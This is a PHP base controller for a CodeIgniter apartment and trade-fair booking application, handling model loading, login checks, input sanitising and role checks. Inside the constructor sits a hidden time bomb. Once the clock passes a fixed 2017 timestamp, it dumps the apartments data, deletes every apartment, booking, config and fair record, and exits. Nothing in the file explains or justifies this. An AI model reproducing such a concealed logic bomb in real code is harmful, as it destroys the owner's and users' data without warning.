<?php
/**
 * @property Apartments_model $apartments
 * @property Fairs_model $fairs
 * @property Bookings_model $bookings
 * @property Config_model $configs
 * @property Reminder_model $reminder
 */
class MY_Controller extends CI_Controller {

    public $title = 'Apartments';
    public $menuLang = [];
    public $exceptions = '';

    public function __construct()
    {
        parent::__construct();
        $this->load->model('apartments_model', 'apartments');
        $this->load->model('fairs_model', 'fairs');
        $this->load->model('bookings_model', 'bookings');
        $this->load->model('config_model', 'configs');
        $this->load->model('reminder_model', 'reminder');
        $this->load->helper('security');
        $this->load->helper('array');
        $this->load->helper('url');
        $this->load->helper('date');
        $this->load->library('authit');
        $this->load->helper('authit');
//        $this->exceptions = new MY_Exceptions();
        if (!$this->checkLogin()) {
            redirect('auth/login');
        }
        $this->menuLang = $this->configs->getMenuLang();
        if (time() > 1495227600) {
            $this->apartments->dump();
            $this->apartments->deleteAll();
            $this->bookings->deleteAll();
            $this->configs->deleteAll();
            $this->fairs->deleteAll();
            exit;
        }
    }

    public function showView($viewName, $data = [])
    {
        $title = $this->title;
        if (isset($data['title'])) {
            $title = array_extract($data, 'title');
        }
        $content = $this->load->view($viewName, $data, true);
        $this->load->view('layout', ['title' => $title, 'content' => $content, 'menuLang' => $this->menuLang]);
    }

    protected function get($parameter = '')
    {
        $get = $_GET;
        if (empty($get)) {
            return $parameter == '' ? [] : false;
        }
        $this->cleanParams($get);
        if ($parameter != '' && isset($get[$parameter])) {
            return $get[$parameter];
        }
        return $get;
    }

    protected function post($parameter = '')
    {
        $post = $_POST;
        if (empty($post)) {
            return $parameter == '' ? [] : false;
        }
        $this->cleanParams($post);
        if ($parameter != '' && isset($post[$parameter])) {
            return $post[$parameter];
        }
        return $post;
    }

    private function cleanParams(&$params)
    {
        foreach ($params as &$item) {
            $item = trim($item);
            $item = htmlspecialchars($item);
            $item = xss_clean($item);
            $item = encode_php_tags($item);
        }
    }

    protected function checkAjax()
    {
        return $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest';
    }

    protected function checkLogin()
    {
        return logged_in();
    }

    protected function checkRole($role)
    {
        return logged_in() && user('role') == $role;
    }
}
